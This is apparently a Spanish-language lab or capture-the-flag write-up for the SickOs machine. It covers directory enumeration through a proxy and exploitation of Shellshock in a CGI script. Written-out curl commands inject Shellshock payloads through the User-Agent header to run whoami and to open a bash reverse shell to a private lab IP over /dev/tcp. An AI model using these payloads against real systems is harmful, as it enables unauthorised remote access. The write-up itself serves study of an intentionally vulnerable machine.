Para que se pueda llevar la bash del servidor tiene que ser un poco antigua

OJO AL UTILIZAR GOBUSTER TENEMOS QUE AGREGAR EL PARAMETRO:
		--add-slash para que encuentre mas directorios ocultos
		quedaria asi nuestro estaneo:
`gobuster dir -u http://192.168.0.249/ --proxy http://192.168.0.249:3128 -w /usr/share/seclistis/Dscovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash`

![[Pasted image 20250415140103.png]]

Como podemos ver en la imagen encontramos un /cgi-bin/ y eso significa que podemos proceder con un shellshock
en base a eso podemos realizar nuestro escaneo buscando archivos con extension pl,sh,cgi

`gobuster dir -u http://192.168.0.249/ --proxy http://192.168.0.249:3128 -w /usr/share/seclistis/Dscovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x pl,sh,cgi

Hemos encontrado /status en la respuesta
nos metemos mediante el proxy
![[Pasted image 20250415140534.png]]

Veamos que tiene dentro:
![[Pasted image 20250415141128.png]]

ahora le hacemos curl a la web y nos arroja lo siguiente:

`curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.0.249:3128 | jq`

`{`
  `"uptime": " 01:41:07 up 3:37, 0 users, load average: 0.00, 0.13, 0.14",`
  `"kernel": "Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux"`
`}`

Aqui se esta haciendo una actualizacion en tiempo real, el comando uptime se esta actualizando

Hay un articulo de cloudfare blog donde nos podemos apoyar llamado Inside ShellShock How hackers are using it to exploit systems

[Inside Shellshock: How hackers are using it to exploit systems](https://blog.cloudflare.com/inside-shellshock/)

Una manera tipica es jugando con el user agent donde injectan 
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com


En nuestro caso utilizaremos el siguiente comando para pasar por proxy al servidor y ejecutar comandos
`*curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.0.249:3128 -H "User Agent: () { :; }; echo; /usr/bin/whoami" *`

La respuesta que nos da:
		www-data

Ahora intentaremos ganar acceso a la maquina levantando una shell
nos levantamos un servidor 443 con nc
Realizamos el siguiente curl para entablar conexion con la maquina:

`root@parrot /opt/intro_hack/Sick0s/content $ curl -s http://127.0.0.1/cgi-bin/status --proxy http://192.168.0.249:3128 -H "User Agent: () { :; }; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.0.62/443 0>&1'`

Asi se veria el ataque:
![[Pasted image 20250415142519.png]]

Ahora crearemos un script el cual sera shellshock de manera automatizada

![[Pasted image 20250415150413.png]]

